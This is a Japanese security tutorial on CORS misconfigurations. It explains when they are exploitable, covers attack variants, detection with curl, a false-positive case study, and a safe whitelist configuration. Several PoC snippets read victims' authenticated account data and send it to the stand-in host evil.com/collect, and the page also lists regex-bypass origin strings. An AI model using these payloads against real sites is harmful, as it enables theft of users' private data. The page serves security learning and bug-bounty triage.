CORS Misconfiguration

Cross-Origin Resource Sharing の設定ミスにより、攻撃者のサイトから被害者の 認証済みデータを読み取る。ただし「exploitable な CORS misconfig」の判断が重要。

Theory WSA Lab Hands-on Case Study

原理と仕組み

Same-Origin Policy (SOP) は、異なるオリジンのリソースへのアクセスを制限する。 CORS はこの制限を緩和する仕組みだが、設定ミスにより意図しないオリジンからの アクセスを許可してしまうことがある。 

// CORS の基本動作
// 1. ブラウザが Origin ヘッダー付きでリクエスト送信
GET /api/user HTTP/1.1
Origin: https://evil.com

// 2. サーバーが Access-Control-Allow-Origin で許可オリジンを返す
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com  ← 問題!
Access-Control-Allow-Credentials: true

// 3. ブラウザが「許可されたオリジン」と判断し、レスポンスを JavaScript に渡す
CORS misconfig が exploitable な条件

以下の 全て が揃う必要がある:

  1. Access-Control-Allow-Origin が攻撃者のオリジンを反映する
  2. Access-Control-Allow-Credentials: true が設定されている
  3. 認証が Cookie ベース (SameSite=None でないと Cookie が送信されない)
  4. レスポンスに機密データが含まれる

種類と分類

1. Origin Reflection (最も危険)

リクエストの Origin ヘッダーをそのまま Access-Control-Allow-Origin に反射する。 

// リクエスト
GET /api/account HTTP/1.1
Origin: https://evil.com
Cookie: session=abc123

// レスポンス
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com  ← 入力がそのまま反射
Access-Control-Allow-Credentials: true
{"email": "victim@target.com", "balance": 50000}

// 攻撃者のサイトに設置する PoC
<script>
fetch('https://target.com/api/account', {credentials: 'include'})
  .then(r => r.json())
  .then(data => {
    // 被害者のデータを攻撃者のサーバーに送信
    fetch('https://evil.com/collect', {
      method: 'POST',
      body: JSON.stringify(data)
    });
  });
</script>

2. Null Origin

Origin: null が許可されている場合。 iframe の sandbox 属性や data: URI から null origin を送信可能。 

// サーバーが null を許可
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true

// 攻撃: sandboxed iframe から null origin を送信
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
        srcdoc="
<script>
fetch('https://target.com/api/account', {credentials: 'include'})
  .then(r => r.text())
  .then(d => location='https://evil.com/collect?data='+btoa(d));
</script>">
</iframe>

3. Subdomain Trust

*.target.com を信頼する設定。サブドメインに XSS があれば CORS bypass 可能。 

// サーバーの検証ロジック:
if (origin.endsWith('.target.com')) {
    headers['Access-Control-Allow-Origin'] = origin;
}

// 攻撃: XSS がある sub.target.com 経由
// sub.target.com での XSS payload:
fetch('https://api.target.com/sensitive', {credentials:'include'})
  .then(r => r.text())
  .then(d => fetch('https://evil.com/collect?d='+btoa(d)))

4. Regex Bypass

// 不十分な正規表現による検証
// 意図: *.target.com のみ許可
// 実装: /target\.com$/

// バイパス:
Origin: https://evil-target.com         // endsWith bypass
Origin: https://target.com.evil.com     // subdomain trick
Origin: https://nottarget.com           // prefix missing

// 別の不十分なパターン
// 意図: https://target.com のみ
// 実装: /^https:\/\/.*target\.com/
Origin: https://evil.com?.target.com    // ? as path separator
Origin: https://evil.com#.target.com    // fragment

5. Pre-flight Bypass

// Simple Request (preflight なし) の条件:
// - GET, HEAD, POST のみ
// - Content-Type: text/plain, multipart/form-data, application/x-www-form-urlencoded
// - カスタムヘッダーなし

// JSON API への CORS 攻撃:
// Content-Type: application/json は preflight が発生する
// → text/plain で送信して Content-Type 検証をバイパス
fetch('https://target.com/api/data', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'text/plain'},
    body: JSON.stringify({action: 'delete'})
});

Exploitable vs Not Exploitable

Exploitable (報告価値あり)
  • Origin reflection + Credentials: true + Cookie-based auth + 機密データ in response
  • Null origin allowed + Credentials: true + 機密データ
  • Subdomain trust + subdomain に XSS あり
NOT Exploitable (報告価値なし - False Positive)
  • Bearer Token (Authorization ヘッダー) のみの認証: CORS はブラウザの Cookie 自動送信を悪用するもの。Authorization ヘッダーは攻撃者のサイトから付与できない
  • Access-Control-Allow-Origin: * (ワイルドカード): Credentials: true と同時に使用不可 (ブラウザが拒否)
  • レスポンスに機密データなし: public API で誰でも取得可能な情報
  • SameSite=Lax/Strict の Cookie: cross-site では Cookie が送信されない
  • 意図的な設計: embed/widget/OTT サービスで意図的に広いオリジンを許可

実体験: Tapple F1 False Positive

CORS wide-open だが header-only auth = no bug

Tapple (マッチングアプリ) の API で CORS が広く開いているように見えたが、 認証が Authorization ヘッダーのみ で Cookie を使用していなかった。

CORS misconfiguration の PoC を書いても、攻撃者のサイトから Authorization ヘッダーを 付与する方法がないため、実際には exploit 不可能。

教訓: CORS misconfig を見つけたら、まず認証メカニズムを確認する。 Cookie auth でなければ CORS は security issue にならない。

検出方法

# 手動テスト
curl -s -I -H "Origin: https://evil.com" https://target.com/api/user | grep -i "access-control"

# 確認すべきレスポンスヘッダー
Access-Control-Allow-Origin: https://evil.com  ← reflection?
Access-Control-Allow-Credentials: true         ← credentials?

# null origin テスト
curl -s -I -H "Origin: null" https://target.com/api/user | grep -i "access-control"

# サブドメインテスト
curl -s -I -H "Origin: https://test.target.com" https://target.com/api/user

# 次に確認: 認証メカニズムは何か?
# Cookie (Set-Cookie with SameSite=None) → exploitable
# Authorization header only → NOT exploitable

Exploit 可否チェックフロー

Step確認事項結果
1Origin reflection あり?No → Not vulnerable
2Credentials: true?No → 機密データ読み取り不可
3Cookie-based auth?No (header only) → Not exploitable
4SameSite=None?No (Lax/Strict) → Cookie 送信されない
5機密データ in response?No → Impact なし
6全て YesExploitable!

防御と Bypass

安全な CORS 設定

// 許可オリジンをハードコード (ホワイトリスト)
const allowedOrigins = ['https://app.target.com', 'https://admin.target.com'];

app.use((req, res, next) => {
    const origin = req.headers.origin;
    if (allowedOrigins.includes(origin)) {
        res.setHeader('Access-Control-Allow-Origin', origin);
        res.setHeader('Access-Control-Allow-Credentials', 'true');
    }
    next();
});

// または完全に無効化 (同一オリジンのみ)
// Access-Control-Allow-Origin ヘッダーを返さない

Key Takeaways

  • CORS misconfig = Cookie auth 前提: Authorization header only なら impact ゼロ
  • 4条件を全確認: reflection + credentials + cookie auth + sensitive data
  • SameSite=Lax が追加防御: cross-origin で Cookie 送信されないなら exploitability なし
  • 意図的設計を見極める: embed/widget/public API は CORS open が正常
  • Subdomain trust + XSS はチェーン価値: subdomain の XSS を探す価値がある
  • False positive に注意: CORS open = 即 vulnerability ではない
